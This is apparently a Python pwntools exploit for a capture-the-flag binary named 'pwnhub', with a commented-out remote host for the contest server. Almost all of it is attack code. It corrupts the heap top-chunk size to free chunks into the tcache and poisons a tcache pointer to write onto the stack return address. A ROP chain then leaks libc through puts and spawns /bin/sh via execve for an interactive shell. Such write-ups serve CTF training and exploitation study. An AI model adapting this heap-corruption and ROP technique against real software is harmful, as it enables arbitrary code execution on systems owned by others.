from pwn import *
import time
import os

context.binary = "./pwnhub"
# context.log_level = 'debug'

r = process('./pwnhub')
#r = remote("pwnhub-01.hfsc.tf",1337)

def alloc(size):
	r.sendlineafter(b'> ', b'3')
	r.recvuntil(b"size: ")
	r.sendline(str(size-1).encode())

def leak():
	r.sendlineafter(b'> ', b'2')
	r.recvuntil(b"leak: ")
	leak = u64(r.recv(6).ljust(8, b"\x00"))
	return leak

def save(data):
	r.sendlineafter(b'> ', b"1")
	time.sleep(0.5)
	r.send(data)

print("STACK PTR:")
stack = leak()
print(hex(stack))

alloc(0)
save(b"a"*0x18 + p64(0xd51))  # overwrite the top chunk
for i in range(22):
	alloc(0x81)

alloc(0x48)  # no space for the next chunk
alloc(0x81)  # the old top is freed
print("---------- 0x80 chunk in tcache")

for i in range(8):
	alloc(0)
	save(b"a"*0x18+p64(0xf51))
	for i in range(26):
		alloc(0x81)
	alloc(0x48)
	alloc(0x81)
print("-----------------------------------")

alloc(0)
save(b"a"*0x18+p64(0xf51))
for i in range(25):
	alloc(0x81)
alloc(0x68)
alloc(0x28)
gdb.attach(r, '''b*0x4014bd''')
save(p64(0x21f80)*2)  # size and prev_size of a fake_chunk
alloc(0x81)
print("we got a 1 chunk in smallbin and a new chunk in tcachebin")


#we allocate from a smallbin, the unsorted bin is created
alloc(0)

#We will overwrite next pointer to the address on the stack
#of main ret function
save(b"a"*0x18+p64(0x21f80))
for i in range(1000):
	alloc(0x81)
alloc(0)
ret_addr = stack + 0x10f
save(b"d"*0x38+p64(0x81)+p64(ret_addr))
#size,    #next
#and a standard allocation of 2 chunks
alloc(0x78)
alloc(0x78)  # this points to the stack!

rop = b""
rop += p64(0x04015e3)  # pop rdi
rop += p64(0x405018)  # puts@got
rop += p64(0x4010B0)  # puts@plt

rop += p64(0x4015DA)
rop += p64(0x0)
rop += p64(0x0)
rop += p64(0x0)  # r12
rop += p64(stack+0x15f)  # r13
rop += p64(0x1000)  # r14
rop += p64(0x405038)  # r15 read@plt
rop += p64(0x4015C0)

save(rop)

#leak puts address
r.sendline("4")  # exit, to return from main
leak = r.recvline()
leak = leak[:-1]
libc_puts = u64(leak.ljust(8, b"\x00"))
print(libc_puts)

#send second ROP
LIBC = ELF("./lib/libc.so.6")
libc_base = libc_puts - LIBC.symbols["puts"]
print(hex(libc_base))

LIBC.address = libc_base
binsh_addr = next(LIBC.search(b"/bin/sh\x00"))
rop = ROP(LIBC)
rop.execve(binsh_addr, 0, 0)
print(rop.dump())
payload = rop.chain()
r.send(payload)
r.interactive()
